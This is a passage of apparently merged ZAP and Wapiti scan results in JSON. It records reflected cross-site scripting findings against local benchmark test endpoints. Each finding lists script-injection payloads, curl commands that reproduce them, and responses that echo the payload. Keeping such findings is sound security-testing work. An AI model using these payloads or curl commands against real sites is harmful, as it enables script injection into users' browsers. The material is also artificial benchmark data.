            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:09 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:21:55 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w3fnv33s4l')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01268?BenchmarkTest01268=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01268?username=alice&password=Letm3in_&BenchmarkTest01268=%3CScRiPt%3Ealert%28%27wrnj0sgg2k%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wrnj0sgg2k')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wrnj0sgg2k')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01268?username=alice&password=Letm3in_&BenchmarkTest01268=%3CScRiPt%3Ealert%28%27wrnj0sgg2k%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01268.html?BenchmarkTest01268=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01268"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01268?BenchmarkTest01268=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01268.html?BenchmarkTest01268=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01268?username=alice&password=Letm3in_&BenchmarkTest01268=%3CScRiPt%3Ealert%28%27wrnj0sgg2k%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:09 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:56 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wrnj0sgg2k')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01506?BenchmarkTest01506=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01506?username=alice&password=Letm3in_&BenchmarkTest01506=%3CScRiPt%3Ealert%28%27wnxp1u0gqc%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wnxp1u0gqc')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wnxp1u0gqc')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01506?username=alice&password=Letm3in_&BenchmarkTest01506=%3CScRiPt%3Ealert%28%27wnxp1u0gqc%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01506.html?BenchmarkTest01506=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01506"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01506?BenchmarkTest01506=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01506.html?BenchmarkTest01506=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01506?username=alice&password=Letm3in_&BenchmarkTest01506=%3CScRiPt%3Ealert%28%27wnxp1u0gqc%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:10 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:58 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wnxp1u0gqc')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01511?BenchmarkTest01511=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01511?username=alice&password=Letm3in_&BenchmarkTest01511=%3CScRiPt%3Ealert%28%27wfl50mvouo%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wfl50mvouo')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wfl50mvouo')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01511?username=alice&password=Letm3in_&BenchmarkTest01511=%3CScRiPt%3Ealert%28%27wfl50mvouo%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01511.html?BenchmarkTest01511=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01511"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01511?BenchmarkTest01511=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01511.html?BenchmarkTest01511=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01511?username=alice&password=Letm3in_&BenchmarkTest01511=%3CScRiPt%3Ealert%28%27wfl50mvouo%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:10 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:21:59 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('wfl50mvouo')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01596?BenchmarkTest01596=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01596?username=alice&password=Letm3in_&BenchmarkTest01596=%3CScRiPt%3Ealert%28%27wijno03ziq%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wijno03ziq')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wijno03ziq')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01596?username=alice&password=Letm3in_&BenchmarkTest01596=%3CScRiPt%3Ealert%28%27wijno03ziq%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01596.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01596"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01596?BenchmarkTest01596=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01596.html?BenchmarkTest01596=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01596?username=alice&password=Letm3in_&BenchmarkTest01596=%3CScRiPt%3Ealert%28%27wijno03ziq%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:10 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:00 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wijno03ziq')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01657?BenchmarkTest01657=%3C%2Fp%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cp%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01657?username=alice&password=Letm3in_&BenchmarkTest01657=%3CScRiPt%3Ealert%28%27wrq9xi2pej%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 4",
                    "Wapiti - 4"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                      "Wapiti - <ScRiPt>alert('wrq9xi2pej')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                  "Wapiti - <ScRiPt>alert('wrq9xi2pej')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01657?username=alice&password=Letm3in_&BenchmarkTest01657=%3CScRiPt%3Ealert%28%27wrq9xi2pej%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01657.html?BenchmarkTest01657=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01657"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
